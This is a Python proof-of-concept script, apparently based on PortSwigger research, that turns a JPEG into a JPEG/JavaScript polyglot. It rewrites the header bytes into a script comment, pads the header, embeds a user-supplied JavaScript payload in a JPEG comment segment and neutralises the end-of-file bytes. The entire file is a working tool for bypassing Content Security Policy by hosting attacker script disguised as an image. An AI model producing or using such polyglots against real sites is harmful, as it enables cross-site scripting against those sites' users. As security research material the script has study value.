import sys
import struct

header_size = 0x2f2a

def main():
    print("NOTE: This program is just a PoC script. You have to provide a javascript file that begins with a valid variable assignment, e.g. '=\"\";'.")
    print("In case that part is not present, the Javascript execution will fail.\nFor a complete explanation of the subject see the wonderful blog post by Gareth Heyes at https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs")
    if len(sys.argv)<4:
        print("Usage: "+sys.argv[0]+" [jpeg file] [script file] [output file name]")
        sys.exit(-1)
    # Reading the JPEG image
    # NOTE: No check is done on the correctness of the JPEG file
    fi = open(sys.argv[1],"rb")
    t = fi.read()
    fi.close()
    b = bytearray(t)
    # Reading the Javascript file to be embedded in the JPEG comment
    fj = open(sys.argv[2],"rb")
    js = fj.read()
    fj.close()
    # If file is too long, exit
    if len(js)>header_size-2:
        print("The javascript file is too long to be embedded in a JPEG comment")
        sys.exit(-1)
    # Getting the original file size for padding
    orig_size = struct.unpack(">H",b[4:6])[0]
    # Creating the Javascript comment
    b[4]=0x2f
    b[5]=0x2a
    orig_header = b[:orig_size+4]
    padding = bytearray(bytes(header_size-orig_size))
    new_header = orig_header + padding
    # The JPEG comment is of the length of the javascript payload + \xff\xfe (comment "tag") + 2 bytes for comment size + initial close comment + final open comment
    # Here we have to initialize the comment "tag" with \xff\xfe
    jpeg_comment = bytearray(bytes(4))
    jpeg_comment[0] = 0xff
    jpeg_comment[1] = 0xfe
    # The jpeg comment size is 2 bytes less than the overall jpeg comment size ( 2 bytes for comment lenght + js body + close comment + last open comment )
    comment_size = len(js)+6
    # The JPEG comment length is in big endian
    jpeg_comment[2] = (comment_size >> 16)
    jpeg_comment[3] = comment_size & 0xff
    # Closing the JS comment opened right at the beginning of the JPEG
    jpeg_comment = jpeg_comment + bytearray(b"\x2a\x2f")
    # Copying the js payload
    jpeg_comment = jpeg_comment + js
    jpeg_comment = jpeg_comment + bytearray(b"\x2f\x2a")
    # Getting the remaining part of the original JPEG file
    orig_content = b[orig_size+4:]
    # Searching for the EOF, and exit if it is not present
    eof = orig_content.find(bytearray(b"\xff\xd9"))
    if eof == -1 or eof<=4:
        print("Error: invalid JPEG file...")
        sys.exit(-1)
    # Change the last 4 bytes before the EOF to close the comment that was opened by the JS file
    # and open a final inline comment to escape the EOF bytes
    orig_content[eof-4] = 0x2a
    orig_content[eof-3] = 0x2f
    orig_content[eof-2] = 0x2f
    orig_content[eof-1] = 0x2f
    # Copy JPEG content in the output file
    fo = open(sys.argv[3],"wb")
    fo.write(new_header)
    fo.write(jpeg_comment)
    fo.write(orig_content)
    fo.close()

if __name__ == "__main__":
    main()
